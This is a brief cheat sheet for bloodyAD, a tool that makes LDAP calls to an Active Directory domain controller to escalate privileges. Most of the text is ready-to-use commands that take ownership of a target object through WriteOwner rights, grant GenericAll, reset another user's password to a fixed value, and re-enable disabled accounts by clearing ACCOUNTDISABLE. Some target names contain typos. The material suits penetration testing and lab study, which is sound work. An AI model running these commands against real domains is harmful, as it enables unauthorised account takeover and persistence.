What is BloodyAD?

bloodyAD can perform specific LDAP calls to a domain controller in order to perform AD privesc. It supports authentication using cleartext passwords.

Usage

Gain Ownership of target OU using WriteOwner privilege

bloodyAD -d $DOMAIN --host $IP -u USER -p PASSWORD set owner TARGET_USER USER
bloodyAD -d $DOMAIN --host $IP -u USER -p PASSWORD add genericAll TARGET_USDR USER

change password

bloodyAD --host $IP -d DOMAIN -u USER -p 'PASSWD' set password 'TARGET' 'pwn123!'

Remove ACCOUNTDISABLE flag

bloodyAD --host $IP -d DOMAIN -u USER -p 'PASSWD' remove uac 'TAEGET_USR' -f ACCOUNTDISABLE
